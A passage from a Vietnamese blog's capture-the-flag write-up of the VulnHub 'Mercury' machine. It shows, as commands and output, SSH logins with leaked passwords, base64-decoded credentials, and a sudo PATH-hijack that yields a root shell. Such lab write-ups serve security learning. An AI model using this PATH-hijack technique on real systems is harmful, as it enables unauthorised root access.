class="line">| 4  | mercuryisthesizeof0.056Earths | webmaster |</span><br><span class="line">+----+-------------------------------+-----------+</span><br></pre></td></tr></table></figure>
+<p>Toẹt vời, mật khẩu lưu trong database nhưng không được mã hóa. Đoán là mấy cái tài khoản này được dùng để đăng nhập vào SSH, chứ cái web tò te này thì làm éo có trang login nào. Zô!<br><em>(Sau vài lần login sai, cuối cùng thì chỉ có mỗi cái tài khoản webmaster là dùng được thôi, còn lại là trap hết)</em></p>
+<h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ ssh webmaster@10.10.10.10                                                                      </span><br><span class="line">webmaster@10.10.10.10&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun 27 Dec 11:16:51 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.15              Processes:               101</span><br><span class="line">  Usage of /:   68.0% of 4.86GB   Users logged in:         0</span><br><span class="line">  Memory usage: 57%               IPv4 address for enp0s3: 10.10.10.10</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">22 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line"></span><br><span class="line">Last login: Tue Sep  1 13:57:14 2020 from 192.168.31.136</span><br><span class="line">webmaster@mercury:~$ id</span><br><span class="line">uid=1001(webmaster) gid=1001(webmaster) groups=1001(webmaster)</span><br><span class="line">webmaster@mercury:~$ ls -al</span><br><span class="line">total 36</span><br><span class="line">drwx------ 4 webmaster webmaster 4096 Sep  2 13:04 .</span><br><span class="line">drwxr-xr-x 5 root      root      4096 Aug 28 11:33 ..</span><br><span class="line">lrwxrwxrwx 1 webmaster webmaster    9 Sep  1 10:01 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 webmaster webmaster  220 Aug 27 13:13 .bash_logout</span><br><span class="line">-rw-r--r-- 1 webmaster webmaster 3771 Aug 27 13:13 .bashrc</span><br><span class="line">drwx------ 2 webmaster webmaster 4096 Aug 27 14:19 .cache</span><br><span class="line">drwxrwxr-x 5 webmaster webmaster 4096 Aug 28 12:56 mercury_proj</span><br><span class="line">-rw-r--r-- 1 webmaster webmaster  807 Aug 27 13:13 .profile</span><br><span class="line">-rw-rw-r-- 1 webmaster webmaster   75 Sep  1 11:01 .selected_editor</span><br><span class="line">-rw------- 1 webmaster webmaster   45 Sep  1 10:09 user_flag.txt</span><br><span class="line">webmaster@mercury:~$ cat user_flag.txt </span><br><span class="line">[user_flag_8339915c9a454657bd60ee58776f4ccd]</span><br></pre></td></tr></table></figure>
+<p>Flag đầu tiên, <strong>[user_flag_8339915c9a454657bd60ee58776f4ccd]</strong>.</p>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Lần mò vào cái thư mục <strong>mercury_proj</strong>, đây là thư mục chứa script python để chạy web server, và có 1 file <strong>notes.txt</strong>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">webmaster@mercury:~/mercury_proj$ ls -al</span><br><span class="line">total 28</span><br><span class="line">drwxrwxr-x 5 webmaster webmaster 4096 Aug 28 12:56 .</span><br><span class="line">drwx------ 4 webmaster webmaster 4096 Sep  2 13:04 ..</span><br><span class="line">-rw-r--r-- 1 webmaster webmaster    0 Aug 27 13:56 db.sqlite3</span><br><span class="line">-rwxr-xr-x 1 webmaster webmaster  668 Aug 27 14:06 manage.py</span><br><span class="line">drwxrwxr-x 6 webmaster webmaster 4096 Sep  1 10:34 mercury_facts</span><br><span class="line">drwxrwxr-x 4 webmaster webmaster 4096 Aug 28 12:47 mercury_index</span><br><span class="line">drwxrwxr-x 3 webmaster webmaster 4096 Aug 28 10:36 mercury_proj</span><br><span class="line">-rw------- 1 webmaster webmaster  196 Aug 28 12:56 notes.txt</span><br><span class="line">webmaster@mercury:~/mercury_proj$ cat notes.txt </span><br><span class="line">Project accounts (both restricted):</span><br><span class="line">webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK</span><br><span class="line">linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==</span><br></pre></td></tr></table></figure>
+<p>Mã hóa đỉnh cao đấy, dùng hẳn base64, nhưng may là tôi có tài crack thiên bẩm nên chỉ mất 1 giây là có thể lấy được mật khẩu bản rõ.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK | base64 -d</span><br><span class="line">mercuryisthesizeof0.056Earths</span><br><span class="line">$ echo bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg== | base64 -d</span><br><span class="line">mercurymeandiameteris4880km</span><br></pre></td></tr></table></figure>
+<p>Tóm được thêm một chú nữa, <code>linuxmaster/mercurymeandiameteris4880km</code>, SSH sang cái tài khoản này xem nào.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">linuxmaster@mercury:~$ sudo -l</span><br><span class="line">[sudo] password for linuxmaster: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for linuxmaster: </span><br><span class="line">Matching Defaults entries for linuxmaster on mercury:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User linuxmaster may run the following commands on mercury:</span><br><span class="line">    (root : root) SETENV: /usr/bin/check_syslog.sh</span><br><span class="line">linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">tail -n 10 /var/log/syslog</span><br></pre></td></tr></table></figure>
+<h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>User linuxmaster có thể chạy &#x2F;usr&#x2F;bin&#x2F;check_syslog.sh với sudo, với quyền root. Nội dung bash script dùng <em>tail</em> để kiểm tra log hệ thống, có thể nghĩ sang cách theo thang đặc quyền sử dụng PATH variables.<br>Theo hướng này, đầu tiên là tạo một file có tên là <strong>tail</strong>, nội dung là <code>/bin/bash</code>, mục đích là khi chạy lệnh <code>sudo /usr/bin/check_syslog.sh</code> với PATH trỏ đến đường dẫn chứa file <strong>tail</strong>, hệ thống sẽ gọi <strong>tail</strong> từ PATH mà chúng ta cung cấp, khi đó file <strong>tail</strong> sẽ được thực thi với quyền root và khởi động shell, vậy là chúng ta sẽ có root shell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">linuxmaster@mercury:~$ mkdir duma</span><br><span class="line">linuxmaster@mercury:~$ cd duma</span><br><span class="line">linuxmaster@mercury:~/duma$ echo &quot;/bin/bash&quot; &gt; tail</span><br><span class="line">linuxmaster@mercury:~/duma$ chmod +x tail </span><br><span class="line">linuxmaster@mercury:~/duma$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxrwxr-x 2 linuxmaster linuxmaster 4096 Dec 27 12:39 .</span><br><span class="line">drwx------ 4 linuxmaster linuxmaster 4096 Dec 27 12:39 ..</span><br><span class="line">-rwxrwxr-x 1 linuxmaster linuxmaster   10 Dec 27 12:39 tail</span><br><span class="line">linuxmaster@mercury:~/duma$ export PATH=$(pwd):$PATH</span><br><span class="line">linuxmaster@mercury:~/duma$ echo $PATH</span><br><span class="line">/home/linuxmaster/duma:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</span><br><span class="line">linuxmaster@mercury:~/duma$ sudo -E PATH=$PATH /usr/bin/check_syslog.sh</span><br><span class="line">root@mercury:~/duma#</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<p>Yay! Vậy là tóm được root shell, giờ thì lấy flag là xong thôi.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@mercury:~# cd /root</span><br><span class="line">root@mercury:/root# ls</span><br><span class="line">root_flag.txt</span><br><span class="line">root@mercury:/root# cat root_flag.txt </span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@(((/(*(/((((((////////&amp;@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@</span><br><span class="line">@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@</span><br><span class="line">@@@@@@*((####((///*//(///*(/*//((/(((//**/((&amp;@@@@@</span><br><span class="line">@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@</span><br><span class="line">@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@</span><br><span class="line">@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@</span><br><span class="line">@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@</span><br><span class="line">@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@</span><br><span class="line">@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@</span><br><span class="line">@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@</span><br><span class="line">@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@</span><br><span class="line">@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@</span><br><span class="line">@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@</span><br><span class="line">@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@</span><br><span class="line">@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line"></span><br><span class="line">Congratulations on completing Mercury!!!</span><br><span class="line">If you have any feedback please contact me at SirFlash@protonmail.com</span><br><span class="line">[root_flag_69426d9fda579afbffd9c2d47ca31d90]</span><br></pre></td></tr></table></figure>
+<p>Tèn ten!<br>Kinh nghiệm bản thân mình rút ra được từ bài này, đó là đừng tìn vào Response status, như ở trên, khi mình dùng <em>dirsearch</em>, nó chả tìm được thư mục nào cả, lí do là vì nó kiểm tra Response status và mặc định sẽ bỏ qua những file&#x2F;folder 404 (Not found). Vậy nên, hãy cứ nhập linh tinh vào cái url xem nó trả về cho mình cái gì, kể cả lỗi cũng được, nhỡ đâu lại vớ được debug thì sao &#x3D;))</p>
+<p>Good luck!</p>
+<h2 id="Further-reading"><a href="#Further-reading" class="headerlink" title="Further reading"></a>Further reading</h2><p><a target="_blank" rel="noopener" href="https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-2-using-path-variables-3P0lPq6o5ox">Leo thao đặc quyền sử dụng PATH variables</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/easy/" rel="tag"># easy</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/12/27/devguru-vulnhub/" rel="next" title="[VulnHub] DevGuru">
+                  [VulnHub] DevGuru <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
